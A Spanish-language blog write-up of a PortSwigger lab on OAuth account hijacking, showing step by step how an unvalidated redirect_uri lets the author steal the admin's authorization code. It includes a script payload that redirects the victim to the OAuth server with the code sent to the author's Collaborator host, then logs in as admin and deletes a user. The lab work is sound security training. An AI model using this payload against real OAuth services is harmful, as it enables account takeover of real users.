---
title: OAuth account hijacking via redirect_uri
description: Laboratorio de Portswigger sobre OAuth
date: 2025-04-15 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - OAuth Vulnerabilities
tags:
  - Portswigger Labs
  - OAuth Vulnerabilities
  - OAuth account hijacking via redirect_uri
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` utiliza un `servicio OAuth` para permitir que los usuarios `inicien sesión` con su `cuenta de redes sociales`. Una `mala configuración` por parte del `proveedor de OAuth` hace posible que un atacante `robe los códigos de autorización` asociados a las cuentas de otros usuarios

Para `resolver` el `laboratorio`, debemos `robar un código de autorización` asociado al usuario `admin`, `usarlo para acceder a su cuenta` y `eliminar al usuario carlos`

El usuario `admin` abrirá cualquier cosa que enviemos desde el `servidor de explotación` y siempre tiene una `sesión activa` con el `servicio OAuth`. Podemos `iniciar sesión` con nuestra propia `cuenta de redes sociales` utilizando las credenciales `wiener:peter`

---

## Guía de vulnerabilidades de OAuth

`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de vulnerabilidades de OAuth` [https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Guide/](https://justice-reaper.github.io/posts/OAuth-Vulnerabilities-Guide/)

## Resolución

Al `acceder` a la `web` vemos esto

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_1.png)

Si pulsamos sobre `My account` nos `redirige` a este `panel de login`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_2.png)

No `logueamos` con las credenciales `wiener:peter`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_3.png)

Posteriormente nos `redirige` a esta otra ventana donde nos `solicita permiso` para `acceder` a nuestro `perfil` e `email`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_4.png)

Si hemos `iniciado sesión` correctamente nos saldrá este `mensaje` al `final`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_5.png)

Si `accedemos` a `My account` veremos nuestro `username` y nuestro `email`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_6.png)

Si nos dirigimos a la extensión `Logger ++` de `Burpsuite` vemos todo el `flujo de peticiones`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_7.png)

Podemos determinar el `grant type` observando la petición a `/auth`. En este caso el parámetro `response_type` tiene el valor `code` lo cual quiere decir que estamos ante un `authorization code grant type`. Además de esto también podemos ver el `nombre de host` del `servidor de autorización`, en este caso es `oauth-0a8c00f0048be6db80281596023800d2.oauth-server.net`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_8.png)

Si la petición a `/oauth-callback` vemos que es el `mismo código` que se está `filtrando` en la `petición anterior`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_9.png)

Lo que hace la `petición` a `/oauth-callback` es `loguearnos` en nuestra cuenta

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_10.png)

Si `enviamos` esta `petición` al `Repeater` y en el parámetro `redirect_uri` introducimos nuestro servidor de `Burpsuite Collaborator` vemos que funciona, lo cual quiere decir que es `vulnerable` a `open redirect`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_11.png)

Si pulsamos sobre `Follow redirect` vemos que efectivamente es `vulnerable`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_12.png)

Si no nos vamos a `Burpsuite Collaborator` vemos que hemos `recibido` el `código`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_13.png)

Nos dirigimos al `Exploit server` y `creamos` este `payload`

```
<script>document.location="https://oauth-0a0f009a03ae2658802e15e602a900e9.oauth-server.net/auth?client_id=ddxknvc302zusuduj1u4p&redirect_uri=https://ebtousjjgb9a0buf1sr5k9tii9o3ct0i.oastify.com&response_type=code&scope=openid%20profile%20email"</script>
```

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_14.png)

Pulsamos sobre `Deliver exploit to victim` y nos dirigimos a `Burpsuite Collaborator`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_15.png)

Si ahora accedemos a `https://0aae00b30373267780e11795004c0075.web-security-academy.net/oauth-callback?code=VWapVul97uPeVdySUeNJs5oTNjf_dfennkF1jlP7Unp` vemos que acabamos de `iniciar sesión` como el usuario `administrador`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_16.png)

Accedemos al `Admin panel` y `eliminamos` la `cuenta` del usuario `carlos`

![](/assets/img/OAuth-Vulnerabilities-Lab-4/image_17.png)
